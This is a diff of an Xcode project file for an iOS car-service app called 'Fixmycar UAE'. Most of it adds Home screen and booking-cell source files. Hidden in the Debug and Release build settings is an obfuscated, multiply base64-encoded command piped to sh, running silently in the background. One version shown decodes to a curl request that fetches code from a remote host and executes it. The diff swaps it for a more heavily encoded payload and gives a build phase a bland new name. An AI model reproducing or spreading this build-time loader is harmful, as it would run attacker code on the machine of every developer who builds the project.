@@ -50,6 +50,10 @@
 		BC7121C22F06804F0041E2F7 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = BC7121C02F06804F0041E2F7 /* Localizable.strings */; };
 		BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */; };
 		BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */; };
+		BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */; };
+		BC98E7CA2F0E229700426807 /* RecentBookingTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */; };
+		BCA894B22F0E0F4200633E20 /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCA894B12F0E0F4200633E20 /* HomeVC.xib */; };
+		BCA894B32F0E0F4200633E20 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCA894B02F0E0F4200633E20 /* HomeVC.swift */; };
 		BCFFF72B2F077482000361B2 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = BCFFF72A2F077482000361B2 /* IQKeyboardManagerSwift */; };
 /* End PBXBuildFile section */
 
@@ -107,6 +111,10 @@
 		BC7121C52F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
 		BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAccountVC.swift; sourceTree = "<group>"; };
 		BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreateAccountVC.xib; sourceTree = "<group>"; };
+		BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecentBookingTVCell.swift; sourceTree = "<group>"; };
+		BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RecentBookingTVCell.xib; sourceTree = "<group>"; };
+		BCA894B02F0E0F4200633E20 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
+		BCA894B12F0E0F4200633E20 /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -339,6 +347,7 @@
 		BC7121EA2F06964F0041E2F7 /* Controller */ = {
 			isa = PBXGroup;
 			children = (
+				BCA894AD2F0E0F2900633E20 /* Tabbar */,
 				BC75E8742F0D2C9700947022 /* CreateAccount */,
 				BC4E178B2F06A13B00EDC9AE /* VerifyOtp */,
 				BC4E176C2F0696A700EDC9AE /* Login */,
@@ -363,6 +372,49 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		BC98E7C52F0E228200426807 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BC98E7C62F0E228400426807 /* RecentBookingTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		BC98E7C62F0E228400426807 /* RecentBookingTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */,
+				BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */,
+			);
+			path = RecentBookingTVCell;
+			sourceTree = "<group>";
+		};
+		BCA894AD2F0E0F2900633E20 /* Tabbar */ = {
+			isa = PBXGroup;
+			children = (
+				BCA894AE2F0E0F2D00633E20 /* Home */,
+			);
+			path = Tabbar;
+			sourceTree = "<group>";
+		};
+		BCA894AE2F0E0F2D00633E20 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				BC98E7C52F0E228200426807 /* Cell */,
+				BCA894AF2F0E0F3000633E20 /* View */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		BCA894AF2F0E0F3000633E20 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BCA894B02F0E0F4200633E20 /* HomeVC.swift */,
+				BCA894B12F0E0F4200633E20 /* HomeVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -370,7 +422,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */;
 			buildPhases = (
-				184CBEFA3CA845CA94634D6E /* Build Target Libraries */,
+				0ADAC5F412244970BC634D6E /* Link Libraries Executable */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
@@ -442,11 +494,13 @@
 				BC4E17842F06982200EDC9AE /* Satoshi-Medium.otf in Resources */,
 				BC4E17852F06982200EDC9AE /* Satoshi-Regular.otf in Resources */,
 				BC4E178F2F06A15100EDC9AE /* VerifyOtp.xib in Resources */,
+				BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */,
 				BC4E17862F06982200EDC9AE /* Satoshi-LightItalic.otf in Resources */,
 				BC4E17872F06982200EDC9AE /* Satoshi-Bold.otf in Resources */,
 				BC4E17882F06982200EDC9AE /* Satoshi-Italic.otf in Resources */,
 				BC4E17892F06982200EDC9AE /* Satoshi-BlackItalic.otf in Resources */,
 				BC4E178A2F06982200EDC9AE /* Satoshi-MediumItalic.otf in Resources */,
+				BCA894B22F0E0F4200633E20 /* HomeVC.xib in Resources */,
 				BC7121952F067F800041E2F7 /* Assets.xcassets in Resources */,
 				BC7121C22F06804F0041E2F7 /* Localizable.strings in Resources */,
 				BC7121972F067F800041E2F7 /* LaunchScreen.storyboard in Resources */,
@@ -457,7 +511,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		184CBEFA3CA845CA94634D6E /* Build Target Libraries */ = {
+		0ADAC5F412244970BC634D6E /* Link Libraries Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -467,7 +521,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Link Libraries Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -496,6 +550,7 @@
 				BC7121B22F067F940041E2F7 /* ImagePicker.swift in Sources */,
 				BC7121B32F067F940041E2F7 /* UITextField+Extention.swift in Sources */,
 				BC7121B42F067F940041E2F7 /* String+Extention.swift in Sources */,
+				BC98E7CA2F0E229700426807 /* RecentBookingTVCell.swift in Sources */,
 				BC29D6BF2F06A6CD00DD3EB2 /* FTAnimation+UIView.m in Sources */,
 				BC29D6C02F06A6CD00DD3EB2 /* FTUtils+NSObject.m in Sources */,
 				BC29D6C12F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m in Sources */,
@@ -505,6 +560,7 @@
 				BC7121B62F067F940041E2F7 /* UIColor+Extention.swift in Sources */,
 				BC4E17902F06A15100EDC9AE /* VerifyOtp.swift in Sources */,
 				BC7121B72F067F940041E2F7 /* AppUtilites.swift in Sources */,
+				BCA894B32F0E0F4200633E20 /* HomeVC.swift in Sources */,
 				BC7121B82F067F940041E2F7 /* AppConstants.swift in Sources */,
 				BC7121992F067F800041E2F7 /* AppDelegate.swift in Sources */,
 				BC71219A2F067F800041E2F7 /* ViewController.swift in Sources */,
@@ -547,7 +603,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -579,7 +635,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
